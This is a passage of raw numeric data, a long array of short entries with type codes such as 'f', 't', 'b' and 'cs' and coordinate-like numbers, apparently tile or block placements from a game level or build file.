5, 1], [1, "f", 1, 70, 5, 1], [1, "f", 1, 72, 5, 1], [1, "f", 1, 75, 5, 1], [1, "f", 1, 79, 5, 1], [1, "f", 2, 68, 5, 1], [1, "f", 2, 71, 5, 1], [1, "f", 2, 74, 5, 1], [1, "f", 2, 76, 5, 1], [1, "f", 2, 78, 5, 1], [1, "f", 0, 69, 5, 1], [1, "f", 0, 73, 5, 1], [1, "f", 0, 77, 5, 1], [1, "f", 0, 80, 5, 1], [1, "f", 1, 81, 5, 1], [1, "f", 1, 84, 5, 1], [1, "f", 1, 87, 5, 1], [1, "f", 1, 89, 5, 1], [1, "f", 1, 92, 5, 1], [1, "f", 1, 94, 5, 1], [1, "f", 0, 82, 5, 1], [1, "f", 2, 83, 5, 1], [1, "f", 2, 85, 5, 1], [1, "f", 2, 88, 5, 1], [1, "f", 2, 90, 5, 1], [1, "f", 2, 93, 5, 1], [1, "f", 2, 95, 5, 1], [1, "f", 0, 86, 5, 1], [1, "f", 0, 91, 5, 1], [1, "f", 2, 6, 153, 1], [1, "f", 1, 6, 152, 1], [1, "t", 1, 93, 301, 0], [1, "t", 3, 94, 302, 0], [1, "t", 5, 95, 302, 0], [1, "t", 5, 93, 302, 0], [1, "b", 3, 92, 302, 0], [1, "t", 1, 91, 302, 0], [1, "t", 5, 90, 302, 0], [1, "b", 2, 92, 301, 0], [1, "t", 1, 91, 301, 0], [1, "t", 2, 90, 301, 0], [1, "b", 2, 89, 302, 0], [1, "t", 4, 89, 301, 0], [1, "t", 1, 88, 302, 0], [1, "t", 2, 88, 301, 0], [1, "t", 3, 87, 302, 0], [1, "t", 4, 87, 299, 0], [1, "t", 4, 86, 302, 0], [1, "t", 1, 85, 302, 0], [1, "t", 5, 85, 301, 0], [1, "b", 2, 84, 302, 0], [1, "t", 5, 83, 302, 0], [1, "t", 1, 82, 302, 0], [1, "t", 5, 81, 302, 0], [1, "t", 2, 80, 302, 0], [1, "t", 4, 79, 302, 0], [1, "t", 2, 78, 302, 0], [1, "b", 1, 77, 302, 0], [1, "b", 2, 76, 302, 0], [1, "t", 2, 75, 302, 0], [1, "t", 4, 74, 302, 0], [1, "b", 1, 73, 302, 0], [1, "t", 2, 72, 302, 0], [1, "t", 4, 71, 302, 0], [1, "b", 3, 70, 302, 0], [1, "t", 1, 69, 302, 0], [1, "t", 2, 68, 302, 0], [1, "t", 5, 67, 302, 0], [1, "b", 1, 66, 302, 0], [1, "t", 2, 65, 302, 0], [1, "t", 4, 64, 302, 0], [1, "b", 3, 63, 302, 0], [1, "t", 5, 62, 302, 0], [1, "b", 1, 61, 302, 0], [1, "t", 3, 60, 302, 0], [1, "t", 4, 59, 302, 0], [1, "b", 2, 58, 302, 0], [1, "t", 5, 57, 302, 0], [1, "t", 1, 56, 302, 0], [1, "t", 3, 55, 302, 0], [1, "t", 4, 54, 302, 0], [1, "t", 1, 53, 302, 0], [1, "t", 5, 52, 302, 0], [1, "t", 2, 51, 302, 0], [1, "t", 4, 50, 302, 0], [1, "t", 2, 49, 302, 0], [1, "b", 1, 48, 302, 0], [1, "t", 3, 47, 302, 0], [1, "t", 4, 46, 302, 0], [1, "t", 1, 45, 302, 0], [1, "t", 2, 44, 302, 0], [1, "t", 5, 43, 302, 0], [1, "t", 2, 42, 302, 0], [1, "t", 1, 41, 302, 0], [1, "t", 4, 40, 302, 0], [1, "b", 2, 39, 302, 0], [1, "t", 5, 38, 302, 0], [1, "t", 1, 37, 302, 0], [1, "t", 2, 36, 302, 0], [1, "t", 5, 35, 302, 0], [1, "t", 0, 34, 302, 0], [1, "t", 3, 33, 302, 0], [1, "t", 4, 32, 302, 0], [1, "b", 1, 31, 302, 0], [1, "t", 2, 30, 302, 0], [1, "t", 4, 29, 302, 0], [1, "t", 2, 28, 302, 0], [1, "t", 5, 27, 302, 0], [1, "b", 3, 26, 302, 0], [1, "t", 1, 25, 302, 0], [1, "t", 4, 24, 302, 0], [1, "t", 2, 23, 302, 0], [1, "t", 1, 22, 302, 0], [1, "t", 5, 21, 302, 0], [1, "t", 2, 20, 302, 0], [1, "t", 4, 19, 302, 0], [1, "b", 1, 18, 302, 0], [1, "t", 5, 17, 302, 0], [1, "t", 3, 16, 302, 0], [1, "t", 1, 15, 302, 0], [1, "t", 5, 14, 302, 0], [1, "t", 3, 13, 302, 0], [1, "t", 4, 12, 302, 0], [1, "t", 1, 11, 302, 0], [1, "t", 2, 10, 302, 0], [1, "t", 4, 9, 302, 0], [1, "b", 3, 8, 302, 0], [1, "t", 5, 8, 302, 0], [1, "t", 5, 7, 302, 0], [1, "b", 2, 6, 302, 0], [1, "t", 1, 6, 301, 0], [1, "t", 4, 6, 300, 0], [1, "t", 2, 6, 299, 0], [1, "b", 0, 6, 298, 0], [1, "t", 5, 6, 297, 0], [1, "t", 2, 6, 296, 0], [1, "t", 0, 6, 295, 0], [1, "b", 2, 6, 294, 0], [1, "t", 5, 6, 293, 0], [1, "t", 1, 6, 292, 0], [1, "b", 0, 6, 291, 0], [1, "t", 2, 6, 290, 0], [1, "t", 5, 6, 289, 0], [1, "t", 1, 6, 288, 0], [1, "t", 4, 6, 287, 0], [1, "t", 2, 6, 286, 0], [1, "t", 5, 6, 285, 0], [1, "t", 2, 6, 284, 0], [1, "b", 0, 6, 283, 0], [1, "t", 2, 6, 282, 0], [1, "t", 5, 6, 281, 0], [1, "b", 2, 6, 280, 0], [1, "t", 5, 6, 279, 0], [1, "t", 1, 6, 278, 0], [1, "t", 4, 6, 277, 0], [1, "t", 3, 6, 276, 0], [1, "t", 5, 6, 275, 0], [1, "b", 0, 6, 274, 0], [1, "t", 5, 6, 273, 0], [1, "t", 1, 6, 272, 0], [1, "t", 4, 6, 271, 0], [1, "b", 3, 6, 270, 0], [1, "t", 5, 6, 269, 0], [1, "t", 1, 6, 268, 0], [1, "t", 4, 6, 267, 0], [1, "t", 1, 6, 266, 0], [1, "t", 3, 6, 265, 0], [1, "t", 4, 6, 264, 0], [1, "b", 2, 6, 263, 0], [1, "t", 5, 6, 262, 0], [1, "t", 3, 6, 261, 0], [1, "t", 0, 6, 260, 0], [1, "t", 5, 6, 259, 0], [1, "t", 1, 6, 258, 0], [1, "t", 3, 6, 257, 0], [1, "t", 4, 6, 255, 0], [1, "t", 3, 6, 254, 0], [1, "t", 5, 6, 253, 0], [1, "b", 2, 6, 252, 0], [1, "t", 5, 6, 251, 0], [1, "t", 1, 6, 250, 0], [1, "t", 3, 6, 249, 0], [1, "t", 4, 6, 248, 0], [1, "b", 3, 6, 247, 0], [1, "t", 5, 6, 246, 0], [1, "t", 3, 6, 245, 0], [1, "t", 5, 6, 244, 0], [1, "t", 0, 6, 243, 0], [1, "t", 4, 6, 242, 0], [1, "t", 3, 6, 241, 0], [1, "t", 5, 6, 240, 0], [1, "b", 0, 6, 239, 0], [1, "t", 3, 6, 238, 0], [1, "t", 4, 6, 237, 0], [1, "t", 1, 6, 236, 0], [1, "t", 5, 6, 235, 0], [1, "b", 2, 6, 234, 0], [1, "t", 2, 6, 233, 0], [1, "t", 4, 6, 232, 0], [1, "b", 3, 6, 231, 0], [1, "t", 5, 6, 230, 0], [1, "t", 1, 6, 229, 0], [1, "t", 2, 6, 228, 0], [1, "t", 5, 6, 227, 0], [1, "b", 2, 6, 226, 0], [1, "t", 4, 6, 225, 0], [1, "t", 0, 6, 224, 0], [1, "t", 2, 6, 223, 0], [1, "t", 0, 6, 222, 0], [1, "b", 2, 6, 221, 0], [1, "t", 4, 6, 220, 0], [1, "b", 3, 6, 219, 0], [1, "t", 5, 6, 218, 0], [1, "t", 0, 6, 217, 0], [1, "t", 3, 6, 216, 0], [1, "b", 0, 6, 215, 0], [1, "t", 4, 6, 214, 0], [1, "t", 2, 6, 213, 0], [1, "t", 0, 6, 212, 0], [1, "t", 2, 6, 211, 0], [1, "b", 3, 6, 210, 0], [1, "t", 0, 6, 209, 0], [1, "t", 5, 6, 207, 0], [1, "t", 2, 6, 208, 0], [1, "t", 0, 6, 206, 0], [1, "t", 2, 6, 205, 0], [1, "t", 2, 6, 203, 0], [1, "b", 0, 6, 202, 0], [1, "t", 3, 6, 201, 0], [1, "t", 4, 6, 199, 0], [1, "t", 0, 6, 198, 0], [1, "t", 2, 6, 197, 0], [1, "t", 4, 6, 196, 0], [1, "t", 1, 6, 195, 0], [1, "t", 3, 6, 194, 0], [1, "t", 4, 6, 192, 0], [1, "t", 2, 6, 191, 0], [1, "b", 0, 6, 190, 0], [1, "t", 3, 6, 189, 0], [1, "t", 4, 6, 187, 0], [1, "b", 0, 6, 186, 0], [1, "t", 2, 6, 185, 0], [1, "t", 4, 6, 184, 0], [1, "t", 2, 6, 183, 0], [1, "t", 0, 6, 182, 0], [1, "b", 2, 6, 181, 0], [1, "t", 5, 6, 180, 0], [1, "t", 2, 6, 179, 0], [1, "t", 0, 6, 178, 0], [1, "t", 2, 6, 177, 0], [1, "t", 4, 6, 176, 0], [1, "b", 2, 6, 175, 0], [1, "t", 1, 6, 174, 0], [1, "t", 5, 6, 173, 0], [1, "t", 2, 6, 256, 0], [1, "t", 4, 6, 204, 0], [1, "t", 4, 6, 200, 0], [1, "t", 2, 6, 193, 0], [1, "t", 2, 6, 188, 0], [1, "f", 1, 6, 150, 1], [1, "f", 2, 6, 151, 1], [1, "f", 2, 6, 149, 1], [1, "f", 1, 6, 148, 1], [1, "f", 2, 6, 147, 1], [1, "f", 2, 6, 145, 1], [1, "f", 2, 6, 143, 1], [1, "f", 1, 6, 146, 1], [1, "f", 1, 6, 144, 1], [1, "f", 1, 6, 142, 1], [1, "f", 2, 6, 141, 1], [1, "f", 2, 6, 139, 1], [1, "f", 2, 6, 137, 1], [1, "f", 2, 6, 135, 1], [1, "f", 2, 6, 133, 1], [1, "f", 1, 6, 140, 1], [1, "f", 1, 6, 138, 1], [1, "f", 1, 6, 136, 1], [1, "f", 1, 6, 134, 1], [1, "f", 1, 6, 132, 1], [1, "f", 2, 6, 131, 1], [1, "f", 2, 6, 129, 1], [1, "f", 2, 6, 127, 1], [1, "f", 2, 6, 125, 1], [1, "f", 2, 6, 123, 1], [1, "f", 2, 6, 121, 1], [1, "f", 1, 6, 130, 1], [1, "f", 1, 6, 128, 1], [1, "f", 1, 6, 126, 1], [1, "f", 1, 6, 124, 1], [1, "f", 1, 6, 122, 1], [1, "f", 1, 6, 120, 1], [1, "f", 2, 6, 119, 1], [1, "f", 2, 6, 117, 1], [1, "f", 2, 6, 115, 1], [1, "f", 2, 6, 113, 1], [1, "f", 2, 6, 111, 1], [1, "f", 2, 6, 109, 1], [1, "f", 1, 6, 118, 1], [1, "f", 1, 6, 116, 1], [1, "f", 1, 6, 114, 1], [1, "f", 1, 6, 112, 1], [1, "f", 1, 6, 110, 1], [1, "f", 1, 6, 108, 1], [1, "f", 1, 6, 106, 1], [1, "f", 1, 6, 104, 1], [1, "f", 2, 6, 107, 1], [1, "f", 2, 6, 105, 1], [1, "f", 2, 6, 103, 1], [1, "f", 2, 6, 101, 1], [1, "f", 2, 6, 99, 1], [1, "f", 2, 6, 97, 1], [1, "f", 2, 6, 95, 1], [1, "f", 2, 6, 93, 1], [1, "f", 2, 6, 91, 1], [1, "f", 1, 6, 102, 1], [1, "f", 1, 6, 100, 1], [1, "f", 1, 6, 98, 1], [1, "f", 1, 6, 96, 1], [1, "f", 1, 6, 94, 1], [1, "f", 1, 6, 92, 1], [1, "f", 1, 6, 90, 1], [1, "f", 1, 6, 88, 1], [1, "f", 1, 6, 86, 1], [1, "f", 2, 6, 89, 1], [1, "f", 2, 6, 87, 1], [1, "f", 2, 6, 85, 1], [1, "f", 2, 6, 83, 1], [1, "f", 2, 6, 81, 1], [1, "f", 2, 6, 79, 1], [1, "f", 2, 6, 77, 1], [1, "f", 1, 6, 84, 1], [1, "f", 1, 6, 82, 1], [1, "f", 1, 6, 80, 1], [1, "f", 1, 6, 78, 1], [1, "f", 1, 6, 76, 1], [1, "f", 2, 6, 75, 1], [1, "f", 2, 6, 73, 1], [1, "f", 2, 6, 71, 1], [1, "f", 2, 6, 69, 1], [1, "f", 2, 6, 67, 1], [1, "f", 2, 6, 65, 1], [1, "f", 1, 6, 74, 1], [1, "f", 1, 6, 72, 1], [1, "f", 1, 6, 70, 1], [1, "f", 1, 6, 68, 1], [1, "f", 1, 6, 66, 1], [1, "f", 1, 6, 64, 1], [1, "f", 2, 6, 63, 1], [1, "f", 2, 6, 61, 1], [1, "f", 2, 6, 59, 1], [1, "f", 2, 6, 57, 1], [1, "f", 2, 6, 55, 1], [1, "f", 2, 6, 53, 1], [1, "f", 2, 6, 51, 1], [1, "f", 1, 6, 62, 1], [1, "f", 1, 6, 60, 1], [1, "f", 1, 6, 58, 1], [1, "f", 1, 6, 56, 1], [1, "f", 1, 6, 54, 1], [1, "f", 1, 6, 52, 1], [1, "f", 1, 6, 50, 1], [1, "f", 2, 6, 49, 1], [1, "f", 2, 6, 47, 1], [1, "f", 2, 6, 45, 1], [1, "f", 2, 6, 43, 1], [1, "f", 2, 6, 41, 1], [1, "f", 2, 6, 39, 1], [1, "f", 1, 6, 48, 1], [1, "f", 1, 6, 46, 1], [1, "f", 1, 6, 44, 1], [1, "f", 1, 6, 42, 1], [1, "f", 1, 6, 40, 1], [1, "f", 1, 6, 38, 1], [1, "f", 2, 6, 37, 1], [1, "f", 2, 6, 35, 1], [1, "f", 2, 6, 33, 1], [1, "f", 2, 6, 31, 1], [1, "f", 2, 6, 29, 1], [1, "f", 2, 6, 27, 1], [1, "f", 1, 6, 36, 1], [1, "f", 1, 6, 34, 1], [1, "f", 1, 6, 32, 1], [1, "f", 1, 6, 30, 1], [1, "f", 1, 6, 28, 1], [1, "f", 1, 6, 26, 1], [1, "f", 2, 6, 25, 1], [1, "f", 2, 6, 23, 1], [1, "f", 2, 6, 21, 1], [1, "f", 2, 6, 19, 1], [1, "f", 2, 6, 17, 1], [1, "f", 2, 6, 15, 1], [1, "f", 1, 6, 24, 1], [1, "f", 1, 6, 22, 1], [1, "f", 1, 6, 20, 1], [1, "f", 1, 6, 18, 1], [1, "f", 1, 6, 16, 1], [1, "f", 2, 6, 13, 1], [1, "f", 2, 6, 11, 1], [1, "f", 2, 6, 9, 1], [1, "f", 2, 6, 7, 1], [1, "f", 1, 6, 14, 1], [1, "f", 1, 6, 12, 1], [1, "f", 1, 6, 10, 1], [1, "f", 1, 6, 8, 1], [1, "f", 1, 6, 6, 1], [1, "f", 1, 8, 6, 1], [1, "f", 2, 7, 6, 1], [1, "f", 2, 9, 6, 1], [1, "f", 2, 11, 6, 1], [1, "f", 2, 13, 6, 1], [1, "f", 2, 15, 6, 1], [1, "f", 1, 10, 6, 1], [1, "f", 1, 12, 6, 1], [1, "f", 1, 14, 6, 1], [1, "f", 1, 16, 6, 1], [1, "f", 1, 18, 6, 1], [1, "f", 1, 20, 6, 1], [1, "f", 1, 22, 6, 1], [1, "f", 1, 24, 6, 1], [1, "f", 1, 26, 6, 1], [1, "f", 2, 17, 6, 1], [1, "f", 2, 19, 6, 1], [1, "f", 2, 21, 6, 1], [1, "f", 2, 23, 6, 1], [1, "f", 2, 25, 6, 1], [1, "f", 2, 27, 6, 1], [1, "f", 2, 29, 6, 1], [1, "f", 2, 31, 6, 1], [1, "f", 2, 33, 6, 1], [1, "f", 1, 28, 6, 1], [1, "f", 1, 30, 6, 1], [1, "f", 1, 32, 6, 1], [1, "f", 1, 34, 6, 1], [1, "f", 2, 67, 6, 1], [1, "f", 2, 69, 6, 1], [1, "f", 2, 71, 6, 1], [1, "f", 2, 73, 6, 1], [1, "f", 2, 75, 6, 1], [1, "f", 1, 68, 6, 1], [1, "f", 1, 70, 6, 1], [1, "f", 1, 72, 6, 1], [1, "f", 1, 74, 6, 1], [1, "f", 1, 76, 6, 1], [1, "f", 2, 77, 6, 1], [1, "f", 2, 79, 6, 1], [1, "f", 2, 81, 6, 1], [1, "f", 2, 83, 6, 1], [1, "f", 2, 85, 6, 1], [1, "f", 1, 78, 6, 1], [1, "f", 1, 80, 6, 1], [1, "f", 1, 82, 6, 1], [1, "f", 1, 84, 6, 1], [1, "f", 1, 86, 6, 1], [1, "f", 2, 87, 6, 1], [1, "f", 2, 89, 6, 1], [1, "f", 2, 91, 6, 1], [1, "f", 2, 93, 6, 1], [1, "f", 1, 88, 6, 1], [1, "f", 1, 90, 6, 1], [1, "f", 1, 92, 6, 1], [1, "f", 1, 94, 6, 1], [1, "f", 2, 95, 6, 1], [1, "f", 1, 95, 7, 1], [1, "f", 1, 83, 7, 1], [1, "f", 1, 81, 7, 1], [1, "f", 1, 79, 7, 1], [1, "f", 1, 77, 7, 1], [1, "f", 1, 75, 7, 1], [1, "f", 1, 73, 7, 1], [1, "f", 1, 71, 7, 1], [1, "f", 1, 69, 7, 1], [1, "f", 1, 33, 7, 1], [1, "f", 1, 31, 7, 1], [1, "f", 1, 29, 7, 1], [1, "f", 1, 27, 7, 1], [1, "f", 1, 25, 7, 1], [1, "f", 1, 23, 7, 1], [1, "f", 1, 21, 7, 1], [1, "f", 1, 19, 7, 1], [1, "f", 1, 17, 7, 1], [1, "f", 1, 15, 7, 1], [1, "f", 1, 13, 7, 1], [1, "f", 1, 11, 7, 1], [1, "f", 1, 9, 7, 1], [1, "f", 1, 7, 7, 1], [1, "s", 0, 7, 8, 1], [1, "t", 4, 7, 174, 0], [1, "t", 5, 7, 175, 0], [1, "t", 4, 7, 176, 0], [1, "b", 2, 7, 177, 0], [1, "t", 3, 94, 301, 0], [1, "b", 3, 95, 301, 0], [1, "t", 4, 96, 301, 0], [1, "t", 1, 97, 301, 0], [1, "t", 2, 98, 301, 0], [1, "t", 4, 99, 301, 0], [1, "t", 2, 100, 301, 0], [1, "t", 4, 96, 304, 0], [1, "t", 2, 96, 302, 0], [1, "t", 2, 97, 304, 0], [1, "t", 2, 96, 303, 0], [1, "t", 5, 97, 303, 0], [1, "t", 5, 98, 304, 0], [1, "b", 2, 97, 302, 0], [1, "b", 2, 99, 304, 0], [1, "t", 1, 98, 303, 0], [1, "t", 4, 98, 302, 0], [1, "t", 4, 99, 303, 0], [1, "t", 4, 100, 304, 0], [1, "t", 5, 99, 302, 0], [1, "t", 5, 101, 303, 0], [1, "t", 2, 100, 303, 0], [1, "t", 0, 100, 302, 0], [1, "t", 0, 101, 304, 0], [1, "t", 4, 102, 304, 0], [1, "f", 0, 94, 7, 1], [1, "f", 1, 93, 7, 1], [1, "f", 1, 92, 7, 1], [1, "f", 0, 91, 7, 1], [1, "f", 1, 90, 7, 1], [1, "f", 1, 89, 7, 1], [1, "f", 0, 88, 7, 1], [1, "f", 1, 87, 7, 1], [1, "f", 1, 86, 7, 1], [1, "f", 1, 85, 7, 1], [1, "f", 0, 84, 7, 1], [1, "f", 1, 82, 7, 1], [1, "f", 0, 80, 7, 1], [1, "f", 1, 78, 7, 1], [1, "f", 0, 76, 7, 1], [1, "f", 1, 74, 7, 1], [1, "f", 0, 72, 7, 1], [1, "f", 0, 70, 7, 1], [1, "f", 1, 68, 7, 1], [1, "f", 1, 32, 7, 1], [1, "f", 0, 30, 7, 1], [1, "f", 1, 28, 7, 1], [1, "f", 0, 26, 7, 1], [1, "f", 1, 24, 7, 1], [1, "f", 0, 22, 7, 1], [1, "f", 1, 20, 7, 1], [1, "f", 0, 18, 7, 1], [1, "f", 1, 16, 7, 1], [1, "f", 0, 14, 7, 1], [1, "f", 1, 12, 7, 1], [1, "f", 0, 10, 7, 1], [1, "f", 1, 8, 7, 1], [1, "s", 1, 7, 9, 1], [1, "f", 0, 95, 152, 1], [1, "f", 1, 95, 151, 1], [1, "f", 0, 95, 11, 1], [1, "f", 1, 95, 12, 1], [1, "f", 1, 95, 14, 1], [1, "f", 1, 95, 19, 1], [1, "f", 0, 95, 15, 1], [1, "f", 0, 95, 20, 1], [1, "f", 1, 95, 21, 1], [1, "f", 1, 95, 26, 1], [1, "f", 1, 95, 37, 1], [1, "f", 0, 95, 44, 1], [1, "f", 1, 95, 50, 1], [1, "f", 1, 95, 52, 1], [1, "f", 0, 95, 53, 1], [1, "f", 1, 95, 54, 1], [1, "f", 1, 95, 62, 1], [1, "f", 0, 95, 55, 1], [1, "f", 1, 95, 64, 1], [1, "f", 0, 95, 58, 1], [1, "f", 0, 95, 61, 1], [1, "f", 0, 95, 68, 1], [1, "f", 0, 95, 72, 1], [1, "f", 0, 95, 78, 1], [1, "f", 1, 95, 115, 1], [1, "f", 1, 95, 117, 1], [1, "f", 1, 95, 128, 1], [1, "f", 0, 95, 85, 1], [1, "f", 0, 95, 91, 1], [1, "f", 0, 95, 95, 1], [1, "f", 0, 95, 114, 1], [1, "f", 2, 95, 113, 1], [1, "f", 1, 95, 119, 1], [1, "f", 0, 95, 120, 1], [1, "f", 1, 95, 121, 1], [1, "f", 0, 95, 127, 1], [1, "f", 1, 95, 130, 1], [1, "f", 0, 95, 131, 1], [1, "f", 1, 95, 132, 1], [1, "f", 1, 95, 136, 1], [1, "f", 0, 95, 137, 1], [1, "f", 0, 95, 143, 1], [1, "f", 0, 95, 147, 1], [1, "f", 1, 95, 138, 1], [1, "f", 1, 95, 144, 1], [1, "f", 1, 95, 10, 1], [1, "f", 0, 95, 8, 1], [1, "f", 1, 95, 9, 1], [1, "f", 0, 95, 13, 1], [1, "f", 1, 95, 16, 1], [1, "f", 1, 95, 17, 1], [1, "f", 0, 95, 18, 1], [1, "f", 1, 95, 45, 1], [1, "f", 0, 95, 51, 1], [1, "f", 1, 95, 56, 1], [1, "f", 1, 95, 57, 1], [1, "f", 1, 95, 59, 1], [1, "f", 1, 95, 60, 1], [1, "f", 1, 95, 63, 1], [1, "f", 0, 95, 65, 1], [1, "f", 1, 95, 66, 1], [1, "f", 1, 95, 67, 1], [1, "f", 1, 95, 69, 1], [1, "f", 1, 95, 70, 1], [1, "f", 0, 95, 71, 1], [1, "f", 1, 95, 73, 1], [1, "f", 1, 95, 74, 1], [1, "f", 0, 95, 75, 1], [1, "f", 1, 95, 76, 1], [1, "f", 1, 95, 77, 1], [1, "f", 1, 95, 79, 1], [1, "f", 1, 95, 80, 1], [1, "f", 0, 95, 81, 1], [1, "f", 1, 95, 82, 1], [1, "f", 0, 95, 83, 1], [1, "f", 1, 95, 84, 1], [1, "f", 1, 95, 86, 1], [1, "f", 1, 95, 88, 1], [1, "f", 0, 95, 87, 1], [1, "f", 1, 95, 89, 1], [1, "f", 1, 95, 90, 1], [1, "f", 1, 95, 92, 1], [1, "f", 1, 95, 93, 1], [1, "f", 1, 95, 94, 1], [1, "f", 1, 95, 96, 1], [1, "f", 1, 95, 97, 1], [1, "f", 0, 95, 98, 1], [1, "f", 1, 95, 99, 1], [1, "f", 1, 95, 100, 1], [1, "f", 0, 95, 101, 1], [1, "f", 1, 95, 102, 1], [1, "f", 0, 95, 103, 1], [1, "f", 1, 95, 104, 1], [1, "f", 1, 95, 105, 1], [1, "f", 0, 95, 106, 1], [1, "f", 1, 95, 107, 1], [1, "f", 1, 95, 108, 1], [1, "f", 1, 95, 109, 1], [1, "f", 0, 95, 110, 1], [1, "f", 1, 95, 111, 1], [1, "f", 0, 95, 112, 1], [1, "f", 1, 95, 116, 1], [1, "f", 0, 95, 118, 1], [1, "f", 0, 95, 122, 1], [1, "f", 1, 95, 123, 1], [1, "f", 1, 95, 124, 1], [1, "f", 0, 95, 125, 1], [1, "f", 1, 95, 126, 1], [1, "f", 1, 95, 129, 1], [1, "f", 1, 95, 133, 1], [1, "f", 0, 95, 134, 1], [1, "f", 1, 95, 135, 1], [1, "f", 1, 95, 139, 1], [1, "f", 0, 95, 140, 1], [1, "f", 1, 95, 141, 1], [1, "f", 1, 95, 142, 1], [1, "f", 1, 95, 146, 1], [1, "f", 0, 95, 145, 1], [1, "f", 1, 95, 148, 1], [1, "f", 1, 95, 149, 1], [1, "f", 1, 95, 150, 1], [1, "f", 1, 95, 153, 1], [1, "cs", 0, 64, 9, 1], [1, "cs", 1, 64, 10, 1], [1, "cs", 2, 64, 16, 1], [1, "cs", 2, 64, 19, 1], [1, "cs", 0, 64, 20, 1], [1, "cs", 1, 64, 21, 1], [1, "cs", 2, 64, 22, 1], [1, "cs", 0, 64, 23, 1], [1, "cs", 2, 64, 24, 1], [1, "cs", 1, 64, 29, 1], [1, "cs", 2, 64, 30, 1], [1, "cs", 3, 64, 31, 1], [1, "cs", 0, 64, 32, 1], [1, "cs", 1, 64, 33, 1], [1, "cs", 2, 64, 34, 1], [1, "cs", 0, 64, 35, 1], [1, "cs", 2, 64, 8, 1], [1, "cs", 2, 65, 8, 1], [1, "cs", 1, 65, 9, 1], [1, "cs", 2, 65, 10, 1], [1, "cs", 3, 65, 11, 1], [1, "cs", 1, 65, 16, 1], [1, "cs", 0, 64, 17, 1], [1, "cs", 3, 65, 17, 1], [1, "cs", 2, 64, 18, 1], [1, "cs", 2, 65, 18, 1], [1, "cs", 0, 65, 19, 1], [1, "cs", 1, 65, 20, 1], [1, "cs", 3, 65, 21, 1], [1, "cs", 2, 65, 22, 1], [1, "cs", 3, 65, 23, 1], [1, "cs", 0, 65, 24, 1], [1, "cs", 2, 65, 29, 1], [1, "cs", 3, 65, 30, 1], [1, "cs", 0, 65, 31, 1], [1, "cs", 1, 65, 32, 1], [1, "cs", 2, 65, 33, 1], [1, "cs", 3, 65, 34, 1], [1, "cs", 2, 63, 9, 1], [1, "cs", 0, 62, 9, 1], [1, "cs", 2, 61, 9, 1], [1, "cs", 0, 60, 9, 1], [1, "cs", 2, 59, 9, 1], [1, "cs", 2, 58, 9, 1], [1, "cs", 0, 57, 9, 1], [1, "cs", 2, 56, 9, 1], [1, "cs", 2, 55, 9, 1], [1, "cs", 2, 54, 9, 1], [1, "cs", 0, 53, 9, 1], [1, "cs", 0, 51, 9, 1], [1, "cs", 2, 52, 9, 1], [1, "cs", 2, 50, 9, 1], [1, "cs", 2, 48, 9, 1], [1, "cs", 2, 49, 9, 1], [1, "cs", 0, 47, 9, 1], [1, "cs", 0, 45, 9, 1], [1, "cs", 0, 43, 9, 1], [1, "cs", 2, 46, 9, 1], [1, "cs", 2, 44, 9, 1], [1, "cs", 2, 42, 9, 1], [1, "cs", 2, 41, 9, 1], [1, "cs", 0, 40, 9, 1], [1, "cs", 2, 39, 9, 1], [1, "cs", 2, 38, 9, 1], [1, "cs", 0, 37, 9, 1], [1, "cs", 0, 63, 8, 1], [1, "cs", 2, 65, 7, 1], [1, "cs", 3, 64, 7, 1], [1, "cs", 2, 62, 8, 1], [1, "cs", 3, 61, 8, 1], [1, "cs", 1, 62, 7, 1], [1, "cs", 2, 63, 7, 1], [1, "cs", 0, 64, 6, 1], [1, "cs", 3, 65, 6, 1], [1, "cs", 2, 63, 6, 1], [1, "cs", 2, 62, 6, 1], [1, "cs", 2, 61, 6, 1], [1, "cs", 2, 60, 6, 1], [1, "cs", 2, 59, 6, 1], [1, "cs", 2, 61, 7, 1], [1, "cs", 0, 60, 7, 1], [1, "cs", 2, 60, 8, 1], [1, "cs", 2, 59, 7, 1], [1, "cs", 2, 59, 8, 1], [1, "cs", 1, 58, 8, 1], [1, "cs", 1, 57, 6, 1], [1, "cs", 1, 55, 7, 1], [1, "cs", 0, 56, 6, 1], [1, "cs", 2, 58, 6, 1], [1, "cs", 2, 58, 7, 1], [1, "cs", 2, 57, 7, 1], [1, "cs", 2, 56, 7, 1], [1, "cs", 2, 55, 6, 1], [1, "cs", 2, 57, 8, 1], [1, "cs", 2, 56, 8, 1], [1, "cs", 2, 55, 8, 1], [1, "cs", 0, 54, 8, 1], [1, "cs", 0, 50, 7, 1], [1, "cs", 0, 53, 6, 1], [1, "cs", 2, 54, 6, 1], [1, "cs", 2, 54, 7, 1], [1, "cs", 2, 53, 7, 1], [1, "cs", 2, 52, 7, 1], [1, "cs", 2, 52, 6, 1], [1, "cs", 1, 52, 8, 1], [1, "cs", 2, 53, 8, 1], [1, "cs", 2, 51, 8, 1], [1, "cs", 2, 51, 7, 1], [1, "cs", 2, 51, 6, 1], [1, "cs", 2, 50, 6, 1], [1, "cs", 2, 50, 8, 1], [1, "cs", 2, 49, 8, 1], [1, "cs", 2, 49, 7, 1], [1, "cs", 2, 49, 6, 1], [1, "cs", 0, 46, 7, 1], [1, "cs", 1, 48, 8, 1], [1, "cs", 1, 44, 7, 1], [1, "cs", 1, 41, 8, 1], [1, "cs", 2, 48, 7, 1], [1, "cs", 2, 48, 6, 1], [1, "cs", 2, 47, 6, 1], [1, "cs", 2, 47, 7, 1], [1, "cs", 2, 47, 8, 1], [1, "cs", 2, 46, 8, 1], [1, "cs", 2, 45, 8, 1], [1, "cs", 2, 45, 7, 1], [1, "cs", 2, 45, 6, 1], [1, "cs", 2, 46, 6, 1], [1, "cs", 2, 44, 6, 1], [1, "cs", 2, 44, 8, 1], [1, "cs", 2, 43, 8, 1], [1, "cs", 2, 43, 7, 1], [1, "cs", 2, 43, 6, 1], [1, "cs", 2, 42, 6, 1], [1, "cs", 2, 42, 7, 1], [1, "cs", 2, 42, 8, 1], [1, "cs", 2, 41, 7, 1], [1, "cs", 2, 41, 6, 1], [1, "cs", 2, 40, 6, 1], [1, "cs", 2, 40, 7, 1], [1, "cs", 2, 40, 8, 1], [1, "cs", 2, 39, 8, 1], [1, "cs", 0, 39, 7, 1], [1, "cs", 1, 38, 8, 1], [1, "cs", 2, 39, 6, 1], [1, "cs", 2, 38, 6, 1], [1, "cs", 2, 37, 6, 1], [1, "cs", 2, 38, 7, 1], [1, "cs", 2, 37, 7, 1], [1, "cs", 2, 37, 8, 1], [1, "cs", 2, 37, 10, 1], [1, "cs", 2, 38, 10, 1], [1, "cs", 0, 38, 11, 1], [1, "cs", 0, 38, 17, 1], [1, "cs", 1, 37, 18, 1], [1, "cs", 